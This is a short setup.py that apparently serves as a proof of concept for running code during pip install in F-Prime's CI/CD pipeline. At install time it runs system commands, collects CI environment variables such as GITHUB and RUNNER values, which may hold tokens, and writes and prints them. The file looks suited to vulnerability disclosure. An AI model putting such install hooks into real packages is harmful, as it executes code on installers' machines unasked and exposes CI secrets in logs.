import os
import subprocess
from setuptools import setup

result = subprocess.run(["id"], capture_output=True, text=True)
hostname = subprocess.run(["hostname"], capture_output=True, text=True)
timestamp = subprocess.run(["date", "-u"], capture_output=True, text=True)
env_vars = {k: v for k, v in os.environ.items() if "RUNNER" in k or "GITHUB" in k or "CI" in k}

poc_output = []
poc_output.append("=== F-Prime CI/CD PoC - Code Execution During pip install ===")
poc_output.append("id: " + result.stdout.strip())
poc_output.append("hostname: " + hostname.stdout.strip())
poc_output.append("timestamp: " + timestamp.stdout.strip())
poc_output.append("cwd: " + os.getcwd())
poc_output.append("CI env vars:")
for k, v in sorted(env_vars.items()):
    poc_output.append("  " + k + "=" + v)
poc_output.append("=============================================================")

output_text = "\n".join(poc_output)

with open("/tmp/fprime-poc-proof.txt", "w") as f:
    f.write(output_text)

print(output_text)

setup(
    name="fprime-poc-harmless",
    version="0.0.1",
    description="PoC - harmless proof of code execution during pip install",
)
